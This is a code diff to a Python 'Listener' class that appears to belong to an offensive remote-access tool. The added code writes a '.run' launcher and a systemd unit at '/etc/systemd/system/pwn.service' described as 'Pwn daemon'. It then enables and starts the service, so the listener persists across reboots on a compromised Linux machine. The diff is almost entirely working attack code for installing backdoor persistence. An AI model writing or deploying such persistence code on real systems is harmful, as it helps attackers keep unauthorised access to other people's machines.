@@ -15,6 +15,7 @@ class Listener:
     #Client, Addr = Server.accept()
 
     def __init__(self):
+        
 
         try:
             self.get_method = argv[1]
@@ -85,13 +86,40 @@ class Listener:
                 print('Just work in python 3.6 +')
                 exit(True)
             
-            with open('.run', mode='w') as _:
-                _.write('python {}/{} run'.format(pwd, filename))
-                _.close()
+            if argv[0].endswith('.py'):
             
-            with open('/etc/systemd/system/pwn.service', mode="w") as _x:
-                _x.write(
-                    '''
+                with open('.run', mode='w') as _:
+                    _.write('python {}/{} run'.format(pwd, filename))
+                    _.close()
+                
+                
+                
+                with open('/etc/systemd/system/pwn.service', mode="w") as _x:
+                    _x.write(
+                        '''
+[Unit]
+Description=Pwn daemon
+
+[Service]
+ExecStart=/bin/bash {}/.pwn/.run
+StandardOutput=syslog
+StandardError=syslog
+SyslogIdentifier=pwn
+
+[Install]
+WantedBy=multi-user.target
+                        '''.format(
+                            pwd
+                        )
+                    )
+                    _x.close()
+            else:
+                with open('.run', mode='w') as _:
+                    _.write('{}/{} run'.format(pwd, filename.replace('./', '')))
+                    _.close()
+                
+                with open('/etc/systemd/system/pwn.service', mode="w") as _x:
+                    _x.write('''
 [Unit]
 Description=Pwn daemon
 
@@ -105,9 +133,8 @@ SyslogIdentifier=pwn
 WantedBy=multi-user.target
                     '''.format(
                         pwd
-                    )
-                )
-                _x.close()
+                    ))
+
                 system('systemctl enable pwn ; systemctl start pwn')
         except PermissionError:
             system('clear')
